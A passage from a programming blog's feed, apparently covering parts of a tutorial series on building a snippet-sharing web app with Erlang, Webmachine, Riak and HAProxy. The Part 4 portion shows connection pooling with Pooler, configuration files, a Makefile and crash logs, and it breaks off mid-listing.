<p>So with all this in mind, and with the <a href="https://github.com/OJ/csd/tree/Part5-20120830/apps/csd_web/priv/www/static" title="User Interface Source">source of the UI readily available</a> for your review, check out the application in action via this little video. It shows the sign-in process, user profile view, adding of new snippets and voting on existing snippets.</p>

<p>Feel free to go to <a href="http://vimeo.com/45499170">Vimeo</a> and watch it full screen.</p>

<iframe src="http://player.vimeo.com/video/45499170" width="500" height="331" frameborder="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>


<p> <p><a href="http://vimeo.com/45499170">Code Smackdown</a> from <a href="http://vimeo.com/thecolonial">OJ Reeves</a> on <a href="http://vimeo.com">Vimeo</a>.</p></p>

<p>That should finally give you an idea of what we&rsquo;re trying to achieve. It&rsquo;s far from perfect and there&rsquo;s plenty more to be done which will see us through another number of parts in this series.</p>

<h2><a id="known-issues"></a>Known Issues</h2>

<p>In the interest of keeping it real it&rsquo;s worth highlighting a few things that we need to address as we progress through development.</p>

<ul>
<li>Some IDs that are generated might come out with slashes in them. When this happens the site is unable to render the page for the snippet. The easy solution to this is to replace all slashes with something else but that&rsquo;s not really what I&rsquo;d like to do. In a future post we&rsquo;re going to revamp the ID generation part of the application to use something a little more sensible (learning opportunities there for everyone, most of all me).</li>
<li>I was recently contacted by a nice bloke by the name of <em>Juan Felipe Garcia Catalan</em> who had done me the honour of following <a href="http://buffered.io/posts/webmachine-erlydtl-and-riak-part-4/" title="Wembachine, ErlyDTL and Riak - Part 4">Part 4</a> in fine detail. He had decided to try the implementation OAuth with another provider an found that it didn&rsquo;t work. It appears that Twitter&rsquo;s OAuth functions slightly differently. A future post will address this problem so that the OAuth integration works with other OAuth providers too. Thank you Juan for letting me know!</li>
<li>The sign in process doesn&rsquo;t handle cases where OAuth fails or the user says &ldquo;no&rdquo; to signing in.</li>
<li>In general, handling failures isn&rsquo;t covered. This will happen over the course of future posts.</li>
</ul>


<h2><a id="finished"></a>Finished!</h2>

<p>This post, to date, is the longest one I&rsquo;ve written. Thanks for sticking with me. I hope you&rsquo;ve learned something or at least enjoyed reading. Please let me know in the comments if I&rsquo;ve made any mistakes. If you have ideas on how to better implement anything I&rsquo;m all ears and would love to hear them. Feel free to point out my crappy typos, grammar issues etc as well.</p>

<p>Thanks again. Until next time!</p>

<p><strong>Note:</strong> The code for Part 5 (this post) can be found on <a href="https://github.com/OJ/csd/tree/Part5-20120830" title="Source code for Part 5">Github</a>.</p>

<p>Other parts in this series: <a href="http://buffered.io/posts/webmachine-erlydtl-and-riak-part-1/" title="Wembachine, ErlyDTL and Riak - Part 1">Part 1</a>, <a href="http://buffered.io/posts/webmachine-erlydtl-and-riak-part-2/" title="Wembachine, ErlyDTL and Riak - Part 2">Part 2</a>, <a href="http://buffered.io/posts/webmachine-erlydtl-and-riak-part-3/" title="Wembachine, ErlyDTL and Riak - Part 3">Part 3</a>, <a href="http://buffered.io/posts/webmachine-erlydtl-and-riak-part-4/" title="Wembachine, ErlyDTL and Riak - Part 4">Part 4</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Webmachine, ErlyDTL and Riak - Part 4]]></title>
    <link href="http://buffered.io/posts/webmachine-erlydtl-and-riak-part-4/"/>
    <updated>2012-02-15T20:50:00+10:00</updated>
    <id>http://buffered.io/posts/webmachine-erlydtl-and-riak-part-4</id>
    <content type="html"><![CDATA[<p><img class="left" src="http://buffered.io/uploads/2010/09/riak-logo.png" title="'Riak Logo'" >For those of you who are new to the series, you may want to check out <a href="http://buffered.io/posts/webmachine-erlydtl-and-riak-part-1/" title="Wembachine, ErlyDTL and Riak - Part 1">Part 1</a>, <a href="http://buffered.io/posts/webmachine-erlydtl-and-riak-part-2/" title="Wembachine, ErlyDTL and Riak - Part 2">Part 2</a> and <a href="http://buffered.io/posts/webmachine-erlydtl-and-riak-part-3/" title="Wembachine, ErlyDTL and Riak - Part 3">Part 3</a> before reading this post. It will help give you some context as well as introduce you to some of the jargon and technology that I&rsquo;m using. If you&rsquo;ve already read then, or don&rsquo;t want to, then please read on!</p>

<p>Upon finishing <a href="http://buffered.io/posts/webmachine-erlydtl-and-riak-part-3/" title="Wembachine, ErlyDTL and Riak - Part 3">Part 3</a> of the series we were finally able to read data from <a href="http://www.basho.com/developers.html#Riak" title="Riak">Riak</a> and see it appear in our web page. This was the first stage in seeing a full end-to-end web application functioning. Of course there is still a great deal to do!</p>

<!--more-->


<h2>Agenda</h2>

<p>In this post we&rsquo;re going to hit a few points of pain:</p>

<ol>
<li>Another slight refactor! We need to manage Riak connections in a smarter way, so we&rsquo;ll do that first.</li>
<li>We&rsquo;ll be dealing with more configuration so we&rsquo;ll change the way our application deals with configuration so that it&rsquo;s all in the one spot and a little easier to manage.</li>
<li>Add the ability for users to sign in. To keep this simple and avoid the need for users to manage yet another login, we&rsquo;re going to use <a href="http://oauth.net/" title="OAuth">OAuth</a> and let people sign in with their <a href="http://twitter.com/" title="Twitter">Twitter</a> accounts.</li>
<li>Store a cookie in the user&rsquo;s browser which contains identifying information and an encrypted set of OAuth tokens.</li>
</ol>


<p>There&rsquo;s little Riak-specific work going on this post as we&rsquo;re focusing on front-end user management. Other than a bit of refactoring the Riak code remains the same as in Part 3. In Part 5 (coming soon) we&rsquo;ll be writing snippets to Riak and associating them to users who have logged into the application via Twitter.</p>

<p><strong>NOTE</strong>: I&rsquo;ll no longer be using <code>localhost</code> in URLs and will instead be using the loopback address, <code>127.0.0.1</code>. The main reason is because we&rsquo;ll be interacting with Twitter which requires a &ldquo;proper&rdquo; address to be used when setting up. A secondary reason is the use of cookies. If I accidentally leave <code>localhost</code> somewhere in the post (or in the images) please let me know.</p>

<p>Again, be warned, this post is a bit of a whopper! So get yourself a drink and get comfortable. Here we go&hellip;</p>

<h2>Another Slight Refactor</h2>

<p>Now that we&rsquo;re at the stage where Riak is going to get used more often we need to do a better job of handling and managing the connections to the cluster. Ideally we should pool a bunch of connections and reuse them across different requests. This reduces the overhead of creating and destroying connections all the time. Initially we&rsquo;re going to make use of Seth&rsquo;s <a href="https://github.com/seth/pooler" title="Pooler">Pooler</a> application (with a slight modification) to handle the pooling of Riak connections for us.</p>

<h3>Fixing HAProxy</h3>

<p>So now that we have a plan to pool connections, the first thing we need to fix is our load-balancer&rsquo;s configuration. At the moment we have configured <a href="http://haproxy.1wt.eu/" title="HAProxy">HAProxy</a> with the following settings:</p>

<figure class='code'><figcaption><span>dev.haproxy.conf </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># now set the default settings for each sub-section</span>
</span><span class='line'>defaults
</span><span class='line'>  .
</span><span class='line'>  .
</span><span class='line'>  <span class="c"># specify some timeouts (all in milliseconds)</span>
</span><span class='line'>  timeout connect 5000
</span><span class='line'>  timeout client 50000
</span><span class='line'>  timeout server 50000
</span><span class='line'>  .
</span><span class='line'>  .
</span></code></pre></td></tr></table></div></figure>


<p>As you can see we&rsquo;ve forced the timeout of connections which means that every connection that is made to the proxy will be killed off when it has been inactive for a long enough period of time. If you were paying attention to the output in the application console window you&rsquo;d have seen something like this appear after making a request:</p>

<pre><code>=ERROR REPORT==== 13-Aug-2011::20:52:01 ===
** Generic server &lt;0.99.0&gt; terminating 
** Last message in was {tcp_closed,#Port&lt;0.2266&gt;}
** When Server state == {state,"127.0.0.1",8080,false,false,undefined,
                               undefined,
                               {[],[]},
                               1,[],infinity,100}
** Reason for termination == 
** disconnected

=CRASH REPORT==== 13-Aug-2011::20:52:01 ===
  crasher:
    initial call: riakc_pb_socket:init/1
    pid: &lt;0.99.0&gt;
    registered_name: []
    exception exit: disconnected
      in function  gen_server:terminate/6
    ancestors: [csd_core_server,csd_core_sup,&lt;0.52.0&gt;]
    messages: []
    links: [&lt;0.54.0&gt;]
    dictionary: []
    trap_exit: false
    status: running
    heap_size: 377
    stack_size: 24
    reductions: 911
  neighbours:
    neighbour: [{pid,&lt;0.54.0&gt;},
                  {registered_name,csd_core_server},
                  {initial_call,{csd_core_server,init,['Argument__1']}},
                  {current_function,{gen_server,loop,6}},
                  {ancestors,[csd_core_sup,&lt;0.52.0&gt;]},
                  {messages,[]},
                  {links,[&lt;0.53.0&gt;,&lt;0.99.0&gt;]},
                  {dictionary,[]},
                  {trap_exit,false},
                  {status,waiting},
                  {heap_size,987},
                  {stack_size,9},
                  {reductions,370}]

=SUPERVISOR REPORT==== 13-Aug-2011::20:52:01 ===
     Supervisor: {local,csd_core_sup}
     Context:    child_terminated
     Reason:     disconnected
     Offender:   [{pid,&lt;0.54.0&gt;},
                  {name,csd_core_server},
                  {mfargs,{csd_core_server,start_link,[]}},
                  {restart_type,permanent},
                  {shutdown,5000},
                  {child_type,worker}]


=PROGRESS REPORT==== 13-Aug-2011::20:52:01 ===
          supervisor: {local,csd_core_sup}
             started: [{pid,&lt;0.104.0&gt;},
                       {name,csd_core_server},
                       {mfargs,{csd_core_server,start_link,[]}},
                       {restart_type,permanent},
                       {shutdown,5000},
                       {child_type,worker}]
</code></pre>

<p>This is paired up with the following output from the HAProxy console:</p>

<pre><code>00000010:riaks.srvcls[0009:000a]
00000010:riaks.clicls[0009:000a]
00000010:riaks.closed[0009:000a]
0000000e:webmachines.srvcls[0006:0007]
0000000e:webmachines.clicls[0006:0007]
0000000e:webmachines.closed[0006:0007]
</code></pre>

<p>These logs from the console clearly indicate that HAProxy is doing exactly what we&rsquo;ve told it to do. It&rsquo;s killing off the connections after a period of time.</p>

<p>For a connection pool this is not a good idea. Therefore we need to modify this configuration so that it doesn&rsquo;t kill off connections. Thankfully this is a very simple thing to do! We delete the lines that force <code>client</code> and <code>server</code> timeouts (I&rsquo;m commenting the lines out to make it obvious which ones you need to remove):</p>

<figure class='code'><figcaption><span>dev.haproxy.conf </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># now set the default settings for each sub-section</span>
</span><span class='line'>defaults
</span><span class='line'>  .
</span><span class='line'>  .
</span><span class='line'>  <span class="c"># specify some timeouts (all in milliseconds)</span>
</span><span class='line'>  timeout connect 5000
</span><span class='line'>  <span class="c">#timeout client 50000</span>
</span><span class='line'>  <span class="c">#timeout server 50000</span>
</span><span class='line'>  .
</span><span class='line'>  .
</span></code></pre></td></tr></table></div></figure>


<p>After making this change to the configuration, HAProxy will no longer kill off the connections. Therefore it&rsquo;s up to us to manage them.</p>

<h3>Connection Pooling</h3>

<p>Given that it is <em>not</em> one of the goals of this series to demonstrate how to create a connection pooling application in Erlang, we&rsquo;re going to use an application that&rsquo;s already out there to do it for us. This application is called <a href="https://github.com/seth/pooler" title="Pooler">Pooler</a>. Out of the box this application does Erlang process pooling, and given that our Riak connections are each Erlang processes, this suits us perfectly.</p>

<p>One thing that I didn&rsquo;t like about the interface to Pooler was that it relied on the caller managing the lifetime of the connection. As a result, I made a small change to the interface in my own <a href="https://github.com/OJ/pooler" title="OJ's Pooler fork">fork</a> which I think helps keep things a little cleaner. This application will be making use of this fork.</p>

<p>First up, we need to add another dependency in our <code>rebar.config</code> file which will pull this application in from Github at a dependency.</p>

<figure class='code'><figcaption><span>apps/csd_core/rebar.config </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">%%-*- mode: erlang -*-</span>
</span><span class='line'><span class="p">{</span><span class="n">deps</span><span class="p">,</span>
</span><span class='line'>  <span class="p">[</span>
</span><span class='line'>    <span class="p">{</span><span class="n">mochiweb</span><span class="p">,</span> <span class="s">&quot;.*&quot;</span><span class="p">,</span> <span class="p">{</span><span class="n">git</span><span class="p">,</span> <span class="s">&quot;git://github.com/mochi/mochiweb&quot;</span><span class="p">,</span> <span class="s">&quot;HEAD&quot;</span><span class="p">}},</span>
</span><span class='line'>    <span class="p">{</span><span class="n">riakc</span><span class="p">,</span> <span class="s">&quot;.*&quot;</span><span class="p">,</span> <span class="p">{</span><span class="n">git</span><span class="p">,</span> <span class="s">&quot;git://github.com/basho/riak-erlang-client&quot;</span><span class="p">,</span> <span class="s">&quot;HEAD&quot;</span><span class="p">}},</span>
</span><span class='line'>    <span class="p">{</span><span class="n">pooler</span><span class="p">,</span> <span class="s">&quot;.*&quot;</span><span class="p">,</span> <span class="p">{</span><span class="n">git</span><span class="p">,</span> <span class="s">&quot;git://github.com/OJ/pooler&quot;</span><span class="p">,</span> <span class="s">&quot;HEAD&quot;</span><span class="p">}}</span>
</span><span class='line'>  <span class="p">]</span>
</span><span class='line'><span class="p">}.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Build the application so that the dependency is pulled and built:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>oj@hitchens ~/code/csd <span class="nv">$ </span>make
</span><span class='line'>
</span><span class='line'>   ... snip ...
</span><span class='line'>
</span><span class='line'>Pulling pooler from <span class="o">{</span>git,<span class="s2">&quot;git://github.com/OJ/pooler&quot;</span>,<span class="s2">&quot;HEAD&quot;</span><span class="o">}</span>
</span><span class='line'>Cloning into pooler...
</span><span class='line'><span class="o">==</span>&gt; pooler <span class="o">(</span>get-deps<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>   ... snip ...
</span><span class='line'>
</span><span class='line'><span class="o">==</span>&gt; pooler <span class="o">(</span>compile<span class="o">)</span>
</span><span class='line'>Compiled src/pooler_app.erl
</span><span class='line'>Compiled src/pooler_pooled_worker_sup.erl
</span><span class='line'>Compiled src/pooler_pool_sup.erl
</span><span class='line'>Compiled src/pooler_sup.erl
</span><span class='line'>Compiled src/pooler.erl
</span><span class='line'>
</span><span class='line'>   ... snip ...
</span></code></pre></td></tr></table></div></figure>


<p>Next we need to take the scalpel to <code>csd_core</code>. When we first created this application, it was intended to manage all of the interaction with Riak and to manage the intricacies of dealing with snippets and other objects without exposing Riak&rsquo;s inner workings to the <code>csd_web</code> application. To do this we put a <a href="http://www.erlang.org/doc/man/gen_server.html" title="gen_server">gen_server</a> in place, called <code>csd_core_server</code>, which handled the incoming requests. It internally established connections to Riak and used them without destroying them.</p>

<p>For now, we&rsquo;ll be keeping this <code>gen_server</code> in place but we&rsquo;re going to make some modifications to it:</p>

<ol>
<li>We&rsquo;ll start and stop <code>pooler</code> when our <code>csd_core</code> application starts and stops.</li>
<li>We&rsquo;ll change the way configuration is managed and add the configuration for <code>pooler</code>.</li>
<li>We&rsquo;ll be removing the code that establishes the connections.</li>
<li>We&rsquo;ll pass the calls through to Riak using the new <code>pooler</code> application.</li>
</ol>


<p>Let&rsquo;s get to it.</p>

<h4>Starting and Stopping Pooler</h4>

<p>Given that we&rsquo;re using <code>pooler</code> the first thing we need to do is make sure that it loads and runs when <code>csd_core</code> fires up. To do this, we need to modify <code>csd_core.erl</code> so that it looks like this:</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_core.erl </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">%% @author OJ Reeves &lt;oj@buffered.io&gt;</span>
</span><span class='line'><span class="c">%% @copyright 2011 OJ Reeves</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% @doc csd_core startup code</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">module</span><span class="p">(</span><span class="n">csd_core</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">author</span><span class="p">(</span><span class="n">&#39;OJ Reeves &lt;oj@buffered.io&gt;&#39;</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">export</span><span class="p">([</span><span class="n">start</span><span class="o">/</span><span class="mi">0</span><span class="p">,</span> <span class="n">start_link</span><span class="o">/</span><span class="mi">0</span><span class="p">,</span> <span class="n">stop</span><span class="o">/</span><span class="mi">0</span><span class="p">]).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">ensure_started</span><span class="p">(</span><span class="nv">App</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>    <span class="k">case</span> <span class="nn">application</span><span class="p">:</span><span class="n">start</span><span class="p">(</span><span class="nv">App</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>        <span class="n">ok</span> <span class="o">-&gt;</span>
</span><span class='line'>            <span class="n">ok</span><span class="p">;</span>
</span><span class='line'>        <span class="p">{</span><span class="n">error</span><span class="p">,</span> <span class="p">{</span><span class="n">already_started</span><span class="p">,</span> <span class="nv">App</span><span class="p">}}</span> <span class="o">-&gt;</span>
</span><span class='line'>            <span class="n">ok</span>
</span><span class='line'>    <span class="k">end</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% @spec start_link() -&gt; {ok,Pid::pid()}</span>
</span><span class='line'><span class="c">%% @doc Starts the app for inclusion in a supervisor tree</span>
</span><span class='line'><span class="nf">start_link</span><span class="p">()</span> <span class="o">-&gt;</span>
</span><span class='line'>    <span class="n">start_common</span><span class="p">(),</span>
</span><span class='line'>    <span class="nn">csd_core_sup</span><span class="p">:</span><span class="n">start_link</span><span class="p">().</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% @spec start() -&gt; ok</span>
</span><span class='line'><span class="c">%% @doc Start the csd_core server.</span>
</span><span class='line'><span class="nf">start</span><span class="p">()</span> <span class="o">-&gt;</span>
</span><span class='line'>    <span class="n">start_common</span><span class="p">(),</span>
</span><span class='line'>    <span class="nn">application</span><span class="p">:</span><span class="n">start</span><span class="p">(</span><span class="n">csd_core</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% @spec stop() -&gt; ok</span>
</span><span class='line'><span class="c">%% @doc Stop the csd_core server.</span>
</span><span class='line'><span class="nf">stop</span><span class="p">()</span> <span class="o">-&gt;</span>
</span><span class='line'>    <span class="nv">Res</span> <span class="o">=</span> <span class="nn">application</span><span class="p">:</span><span class="n">stop</span><span class="p">(</span><span class="n">csd_core</span><span class="p">),</span>
</span><span class='line'>    <span class="nn">application</span><span class="p">:</span><span class="n">stop</span><span class="p">(</span><span class="n">pooler</span><span class="p">),</span>
</span><span class='line'>    <span class="nn">application</span><span class="p">:</span><span class="n">stop</span><span class="p">(</span><span class="n">crypto</span><span class="p">),</span>
</span><span class='line'>    <span class="nv">Res</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% @private</span>
</span><span class='line'><span class="nf">start_common</span><span class="p">()</span> <span class="o">-&gt;</span>
</span><span class='line'>    <span class="n">ensure_started</span><span class="p">(</span><span class="n">crypto</span><span class="p">),</span>
</span><span class='line'>    <span class="n">ensure_started</span><span class="p">(</span><span class="n">pooler</span><span class="p">).</span>
</span></code></pre></td></tr></table></div></figure>


<p>This code will start and stop the <code>pooler</code> application along with our application. Exactly what we need!</p>

<h4>Fixing Configuration</h4>

<p>Our rudimentary configuration module, <code>csd_riak_config.erl</code>, is now obsolete. We&rsquo;re going to remove it and replace it with something a little more complicated which will not only make it easier to handle configuration using Erlang&rsquo;s built-in <a href="http://www.erlang.org/doc/man/config.html" title="Erlang configuration">configuration</a> handling, but we&rsquo;ll add some code which will make it easier to access configuration both in development <em>and</em> once the application has been deployed.</p>

<p>Let&rsquo;s start by creating a new file:</p>

<figure class='code'><figcaption><span>apps/csd_core/priv/app.config </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="p">[</span>
</span><span class='line'>  <span class="p">{</span><span class="n">pooler</span><span class="p">,</span> <span class="p">[</span>
</span><span class='line'>      <span class="p">{</span><span class="n">pools</span><span class="p">,</span> <span class="p">[</span>
</span><span class='line'>          <span class="p">[</span>
</span><span class='line'>            <span class="p">{</span><span class="n">name</span><span class="p">,</span> <span class="s">&quot;haproxy&quot;</span><span class="p">},</span>
</span><span class='line'>            <span class="p">{</span><span class="n">max_count</span><span class="p">,</span> <span class="mi">30</span><span class="p">},</span>
</span><span class='line'>            <span class="p">{</span><span class="n">init_count</span><span class="p">,</span> <span class="mi">5</span><span class="p">},</span>
</span><span class='line'>            <span class="p">{</span><span class="n">start_mfa</span><span class="p">,</span> <span class="p">{</span><span class="n">riakc_pb_socket</span><span class="p">,</span> <span class="n">start_link</span><span class="p">,</span> <span class="p">[</span><span class="s">&quot;127.0.0.1&quot;</span><span class="p">,</span> <span class="mi">8080</span><span class="p">]}}</span>
</span><span class='line'>          <span class="p">]</span>
</span><span class='line'>        <span class="p">]}</span>
</span><span class='line'>    <span class="p">]}</span>
</span><span class='line'><span class="p">].</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>pooler</code> is smart enough to pool connections across multiple nodes. This is quite a nifty feature, but not one that we&rsquo;re making use of because we have HAProxy in place. Therefore, the configuration above is telling Pooler to use just one single node/pool (ie. the proxy), to create 5 connections and to allow up to 30 to be created if required.</p>

<p>The last parameter in the configuration, <code>start_mfa</code>, tells <code>pooler</code> which module, function and arguments to invoke to create the Erlang process from. In our case we want it to create a pool of Riak client connections, hence why we&rsquo;ve specified the <code>start_link</code> function in the <code>riakc_pb_socket</code> module.</p>

<p>Next we modify our <code>Makefile</code> so that when we invoke <code>make webstart</code> the configuration is properly included:</p>

<figure class='code'><figcaption><span>Makefile </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>.PHONY: deps
</span><span class='line'>
</span><span class='line'><span class="nv">REBAR</span><span class="o">=</span><span class="sb">`</span>which rebar <span class="o">||</span> ./rebar<span class="sb">`</span>
</span><span class='line'>
</span><span class='line'>all: deps compile
</span><span class='line'>
</span><span class='line'>compile:
</span><span class='line'>    @<span class="k">$(</span>REBAR<span class="k">)</span> compile
</span><span class='line'>
</span><span class='line'>app:
</span><span class='line'>    @<span class="k">$(</span>REBAR<span class="k">)</span> compile <span class="nv">skip_deps</span><span class="o">=</span><span class="nb">true</span>
</span><span class='line'>
</span><span class='line'>deps:
</span><span class='line'>    @<span class="k">$(</span>REBAR<span class="k">)</span> get-deps
</span><span class='line'>
</span><span class='line'>clean:
</span><span class='line'>    @<span class="k">$(</span>REBAR<span class="k">)</span> clean
</span><span class='line'>
</span><span class='line'>distclean: clean
</span><span class='line'>    @<span class="k">$(</span>REBAR<span class="k">)</span> delete-deps
</span><span class='line'>
</span><span class='line'><span class="nb">test</span>: app
</span><span class='line'>    @<span class="k">$(</span>REBAR<span class="k">)</span> eunit <span class="nv">skip_deps</span><span class="o">=</span><span class="nb">true</span>
</span><span class='line'>
</span><span class='line'>webstart: app
</span><span class='line'>    <span class="nb">exec </span>erl -pa <span class="k">$(</span>PWD<span class="k">)</span>/apps/*/ebin -pa <span class="k">$(</span>PWD<span class="k">)</span>/deps/*/ebin -boot start_sasl -config <span class="k">$(</span>PWD<span class="k">)</span>/apps/csd_core/priv/app.config -s reloader -s csd_core -s csd_web
</span><span class='line'>
</span><span class='line'>proxystart:
</span><span class='line'>    @haproxy -f dev.haproxy.conf
</span></code></pre></td></tr></table></div></figure>


<p>At this point we are able to build and run the application just as we were before. The first thing you&rsquo;ll notice is that the HAProxy console immediately registers 5 new connections:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0000004:dbcluster.accept<span class="o">(</span>0005<span class="o">)=</span>0006 from <span class="o">[</span>127.0.0.1:34536<span class="o">]</span>
</span><span class='line'>00000005:dbcluster.accept<span class="o">(</span>0005<span class="o">)=</span>0008 from <span class="o">[</span>127.0.0.1:58770<span class="o">]</span>
</span><span class='line'>00000006:dbcluster.accept<span class="o">(</span>0005<span class="o">)=</span>000a from <span class="o">[</span>127.0.0.1:44734<span class="o">]</span>
</span><span class='line'>00000007:dbcluster.accept<span class="o">(</span>0005<span class="o">)=</span>000c from <span class="o">[</span>127.0.0.1:33874<span class="o">]</span>
</span><span class='line'>00000008:dbcluster.accept<span class="o">(</span>0005<span class="o">)=</span>000e from <span class="o">[</span>127.0.0.1:35815<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is evidence that <code>pooler</code> is doing its job and starting with 5 connections. Now that we have this in place, let&rsquo;s get rid of the old configuration:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>oj@hitchens ~/code/csd <span class="nv">$ </span>rm apps/csd_core/src/csd_riak_config.erl
</span></code></pre></td></tr></table></div></figure>


<p>That was easy! We now need to remove any references to this module, thankfully the only module that used was <code>csd_core_server.erl</code>, and that&rsquo;s the one we&rsquo;re going to fix up now. After removing references to the configuration, removing connection creation and replacing it with calls to <code>pooler</code>, <code>csd_core_server</code> now looks like this:</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_core_server.erl </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
